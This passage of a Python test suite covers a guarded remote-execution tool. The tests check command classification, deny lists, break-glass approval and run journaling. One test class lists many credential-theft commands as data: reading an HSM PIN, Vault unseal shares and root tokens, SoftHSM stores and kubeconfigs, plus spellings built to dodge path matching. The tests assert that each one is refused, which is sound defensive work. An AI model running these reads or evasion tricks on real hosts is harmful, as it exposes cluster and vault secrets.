            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "risky", cmd)

    def test_kubectl_mutations_still_risky(self):
        for cmd in ("kubectl delete pod x", "k3s kubectl apply -f x.yaml",
                    "kubectl scale deploy/x --replicas=0"):
            self.assertEqual(vpsexec.classify(cmd, DENY)[0], "risky", cmd)

    def test_config_view_is_not_whitelisted_as_read(self):
        # `config view` can print kubeconfig secrets — must NOT be a plain read.
        self.assertNotEqual(
            vpsexec.classify("kubectl config view", DENY)[0], "read")


class KubeconfigSecretPathTest(unittest.TestCase):
    """The k3s admin kubeconfig is root-on-cluster — refused on every tier,
    like any credential path, from the credential-path deny list."""

    def _deny(self):
        pol = vpsexecpolicy.load(SECRETS_POLICY, deny_patterns=DENY)
        return DENY + pol["deny_extra"]

    def test_kubeconfig_paths_refused(self):
        deny = self._deny()
        for cmd in ("cat /etc/rancher/k3s/k3s.yaml",
                    "cat ~/.kube/config",
                    "grep token /root/.kube/config",
                    "cat /opt/x/kubeconfig"):
            with self.assertRaises(Refused, msg=cmd):
                vpsexec.classify(cmd, deny)


class HsmSecretPathTest(_Harness):
    """An HSM daemon's PIN, wrapped unseal shares and SoftHSM token store, and
    the Vault init/root material, from the credential-path deny list.

    The daemon here is `hsmd`: /etc/hsmd/pin is its user PIN and
    /etc/hsmd/share-N.wrapped a wrapped Vault unseal share. Without these
    entries `cat /etc/hsmd/pin` is a READ: no --run, no approval, fine on a
    frozen host. Across three nodes that is PIN + share + token for a quorum
    of unseal shares, printed and journaled.

    TOOL and POLICY are class attributes so an estate can rerun every
    assertion against its own daemon name and its own policies/."""

    TOOL = "hsmd"
    POLICY = SECRETS_POLICY
    GROUPS = {"web": ["web1", "web3"]}

    # The exfiltration in the finding, plus each spelling that dodges a naive
    # path substring: doubled slash, dot segment, relative to a cd, through
    # /proc/self/root, quoted or escaped, and the directory itself.
    # {t} is TOOL, {T} TOOL.upper(), {a}/{b} TOOL split in two.
    READ_TEMPLATES = (
        "cat /etc/{t}/pin",
        "head -c 64 /etc/{t}/pin",
        "cat /etc/{t}/share-3.wrapped",
        "cat /etc//{t}/pin",
        "cat /etc/./{t}/pin",
        "cat /etc/{t}/../{t}/pin",
        "cd /etc && cat {t}/pin",
        "cd /etc/{t} && cat pin",
        "cd /etc/{t}; cat share-1.wrapped",
        "cat /proc/self/root/etc/{t}/pin",
        "cat '/etc/{t}/pin'",
        'cat /etc/{a}"{b}"/pin',
        "cat /etc/{a}\\{b}/pin",
        "ls -la /etc/{t}",
        "cat /run/{t}/submitted-shares",
        "cat /root/share-2.wrapped",
        "strings /var/lib/softhsm/tokens/x/y.object",
        "grep -r -a . /var/lib/softhsm/tokens",
        "cd /var/lib && grep -r -a . softhsm",
        "cat /etc/softhsm/softhsm2.conf",
        "softhsm2-util --show-slots",
        "pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so --login --list-objects",
        "pkcs11-tool --login --pin env:{T}_PIN --list-objects",
        "p11tool --list-all",
        "grep {T}_PIN /proc/1/environ",
        "cat /root/vault-init.json",
        "cat ~/vault-root.txt",
        "jq -r .root_token /tmp/init.json",
        "grep -r unseal_keys /root",
        "cat /root/.vault-token",
        # The finding's own command line, verbatim.
        "cat /etc/{t}/pin; base64 /etc/{t}/share-*.wrapped; "
        "tar c /var/lib/softhsm/tokens | base64",
    )

    @classmethod
    def names(cls):
        half = len(cls.TOOL) // 2
        return {"t": cls.TOOL, "T": cls.TOOL.upper(),
                "a": cls.TOOL[:half], "b": cls.TOOL[half:]}

    @classmethod
    def setUpClass(cls):
        # Loaded once: a full policy load per dispatch would dominate the suite.
        cls.SHIPPED = vpsexecpolicy.load(cls.POLICY, deny_patterns=DENY)["deny_extra"]
        cls.SECRET_READS = tuple(t.format(**cls.names()) for t in cls.READ_TEMPLATES)

    def fmt(self, text):
        return text.format(**self.names())

    def _deny_extra(self):
        return list(self.SHIPPED)

    def _dispatch(self, argv, runbooks=(), prompt=None):
        return vpsexec.dispatch(
            argv, guard=_guard(), prober=self.prober(),
            policy=_yaml_policy(groups=self.GROUPS, runbooks=list(runbooks),
                                deny_extra=self._deny_extra()),
            ssh=self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today="2026-08-27",
            blackout_runner=self.blackout_runner(unavailable=True))

    def test_entries_are_shipped(self):
        deny_extra = self._deny_extra()
        for entry in ("/etc/{t}", "{t}/", ".wrapped", "softhsm",
                      "pkcs11-tool", "p11tool", "{t}_pin", "{t}_dev_key",
                      "vault-init", "vault-root", "unseal_keys", "root_token",
                      ".vault-token"):
            self.assertIn(self.fmt(entry), deny_extra)

    def test_secret_reads_are_refused_by_the_classifier(self):
        deny = DENY + self._deny_extra()
        for cmd in self.SECRET_READS:
            with self.assertRaises(Refused, msg=cmd) as cm:
                vpsexec.classify(cmd, deny)
            self.assertIn("deny-always", str(cm.exception), cmd)

    def test_refused_as_a_plain_read_on_every_host_posture(self):
        # edge1 is test, web3 released, web1 frozen: a read needs no --run on any.
        for cmd in self.SECRET_READS:
            for spec in ("edge1", "web3", "web1", "edge1,web3,web1"):
                self.ssh_calls = []
                with self.assertRaises(Refused, msg=(spec, cmd)):
                    self._dispatch([spec, cmd])
                self.assertEqual(self.ssh_calls, [], (spec, cmd))

    def test_refused_inside_a_container_too(self):
        for cmd in (self.fmt("cat /etc/{t}/pin"), "softhsm2-util --show-slots"):
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=cmd):
                self._dispatch(["edge1", cmd, "--in", "blog-web"])
            self.assertEqual(self.ssh_calls, [], cmd)

    def test_break_glass_with_a_committed_runbook_still_refuses(self):
        """A break_glass runbook naming the exact command, --break-glass, --run,
        a reason and the right approval phrase: still refused, nothing dialled."""
        control = "systemctl restart nginx"
        self.assertEqual(self._dispatch(
            ["@web", control, "--break-glass", "--run", "--reason", "OPS-1"],
            runbooks=[_runbook(["web1", "web3"], control, break_glass=True)],
            prompt=lambda m: "BREAK-GLASS:2"), 0, "control run must reach the hosts")
        for cmd in self.SECRET_READS:
            self.ssh_calls = []
            with self.assertRaises(Refused, msg=cmd) as cm:
                self._dispatch(["@web", cmd, "--break-glass", "--run", "--reason", "OPS-1"],
                               runbooks=[_runbook(["web1", "web3"], cmd, break_glass=True)],
                               prompt=lambda m: "BREAK-GLASS:2")
            self.assertIn("deny-always", str(cm.exception), cmd)
            self.assertEqual(self.ssh_calls, [], cmd)

    def test_no_override_can_lift_them(self):
        deny = DENY + self._deny_extra()
        for cmd in (self.fmt("cat /etc/{t}/pin"), self.fmt("cat /etc/{t}/share-1.wrapped"),
                    "softhsm2-util --show-slots", "cat /root/vault-init.json"):
            body = ("version: 1\nexpires: \"2999-01-01\"\nreason: \"please\"\nallow:\n"
                    "  - hosts: [edge1]\n    cmd: \"%s\"\n    where: host\n"
                    "    why: \"i need it\"\n" % cmd)
            with self.assertRaises(Refused, msg=cmd) as cm:
                vpsexec.load_override(_write(body), deny, today="2026-08-27")
            self.assertIn("tampered", str(cm.exception), cmd)

    def test_glob_and_substitution_spellings_are_refused(self):
        deny = DENY + self._deny_extra()
        t = self.TOOL
        hexed = "\\x%02x%s" % (ord(t[0]), t[1:])
        for cmd in ("cat /etc/%s*/pin" % t[:-1], "cat /etc/%s?/pin" % t[:-1],
                    "cat /etc/[%s]%s/pin" % (t[0], t[1:]), "cat $(echo /etc/%s)/pin" % t,
                    "cat `echo /etc/%s/pin`" % t, "cat $'/etc/%s/pin'" % hexed,
                    "cat /etc/{%s,x}/pin" % t):
            with self.assertRaises(Refused, msg=cmd):
                vpsexec.classify(cmd, deny)

    def test_a_bare_relative_directory_is_never_a_read(self):
        """Residual the substring matcher cannot see: the daemon's directory
        with no slash after a cd. It is not refused outright, but it is not a
        read either: it needs --run and an approval with the plan in front of
        a human."""
        deny = DENY + self._deny_extra()
        tier, _ = vpsexec.classify(self.fmt("cd /etc && cd {t} && cat pin"), deny)
        self.assertNotEqual(tier, "read")

    def test_burn_in_reads_and_unrelated_reads_still_run(self):
        deny = DENY + self._deny_extra()
        for ok in ("systemctl is-active {t}", "journalctl -u {t} -n 20 --no-pager",
                   "systemctl status {t}", "systemctl cat {t}",
                   "cat /etc/hostname", "ls /etc", "df -h"):
            self.assertEqual(vpsexec.classify(self.fmt(ok), deny)[0], "read", ok)
        active = self.fmt("systemctl is-active {t}")
        self.ssh_calls = []
        self.assertEqual(self._dispatch(["edge1,web3,web1", active]), 0)
        self.assertEqual(sorted(h for h, _ in self.ssh_calls), ["edge1", "web1", "web3"])
        self.assertEqual(set(self.cmds()), {active})


class LastRunTest(DispatchTest):
    """`vpsexec last`: a human runs break-glass in their own terminal and says
    "done"; the agent reads the result from the journal. No pasting."""

    def _mutate(self, out="line1\nline2", err="", host="edge1"):
        return self._run([host, "./deploy.sh", "--run", "--reason", "OPS-7 fix"],
                         prompt=lambda m: host, ssh=self.fake_ssh(out=out, err=err))

    def _last(self, argv=()):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            self.assertEqual(self._run(["last"] + list(argv)), 0)
        return buf.getvalue()

    def test_full_stdout_and_stderr_are_journaled_past_the_old_500_cap(self):
        big = "x" * 3000
        self._mutate(out=big, err="warning: y")
        step = [r for r in vpsexeclog.read() if r["event"] == "step"][-1]
        self.assertEqual(step["stdout"], big)
        self.assertEqual(step["stderr"], "warning: y")
        # The legacy field keeps its old shape (stderr wins, 500 cap).
        self.assertEqual(step["detail"], "warning: y")

    def test_output_is_capped(self):
        self._mutate(out="z" * (vpsexec.STEP_OUTPUT_CAP + 100))
        step = [r for r in vpsexeclog.read() if r["event"] == "step"][-1]
        self.assertEqual(len(step["stdout"]), vpsexec.STEP_OUTPUT_CAP)

    def test_last_shows_command_reason_output_and_result(self):
        self._mutate(out="deployment scaled")
        text = self._last()
        for want in ("./deploy.sh", "OPS-7 fix", "deployment scaled", "RESULT  : ok"):
            self.assertIn(want, text)

    def test_last_reports_failure(self):
        self._run(["edge1", "./deploy.sh", "--run", "--reason", "x"],
                  prompt=lambda m: "edge1", ssh=self.fake_ssh(rcs={"edge1": 3}))
        self.assertIn("failed=['edge1']", self._last())

    def test_last_filters_by_host_and_count(self):
        self._mutate(out="first-run")
        self._mutate(out="second-run")
        one = self._last()
        self.assertIn("second-run", one)
        self.assertNotIn("first-run", one)
        self.assertIn("first-run", self._last(["-n", "2"]))
        self.assertEqual(self._last(["web3"]).strip(), "no mutation runs in the journal")

    def test_interrupted_run_is_shown_as_incomplete(self):
        journal.append("vpsexec", {"event": "mutation_attempt", "hosts": ["edge1"],
                                   "command": "c", "reason": "r"})
        journal.append("vpsexec", {"event": "step", "host": "edge1", "rc": 0,
                                   "remote": "c", "stdout": "half", "stderr": ""})
        self.assertIn("INCOMPLETE", self._last())

    def test_reads_are_not_runs(self):
        self._run(["edge1", "df -h"])
        self.assertEqual(vpsexeclog.runs(vpsexeclog.read()), [])

    def test_export_still_strips_the_new_output_fields(self):
        self._mutate(out="TOKEN=abc123")
        for rec in vpsexeclog.export(vpsexeclog.read()):
            self.assertNotIn("abc123", json.dumps(rec))

    def test_unknown_flag_refuses(self):
        with self.assertRaises(Refused):
            self._run(["last", "--bogus"])


class LastRunHardeningTest(DispatchTest):
    _mutate = LastRunTest._mutate
    _last = LastRunTest._last

    def test_remote_terminal_escapes_are_not_replayed(self):
        # secretmask strips escapes at the door, before the journal; render
        # escaping still covers records written before that (test_secretmask).
        self._mutate(out="ok\x1b[2J\x1b[Hfake")
        text = self._last()
        self.assertNotIn("\x1b", text)
        self.assertIn("okfake", text)

    def test_non_numeric_count_refuses_instead_of_crashing(self):
        with self.assertRaises(Refused):
            self._run(["last", "-n", "abc"])
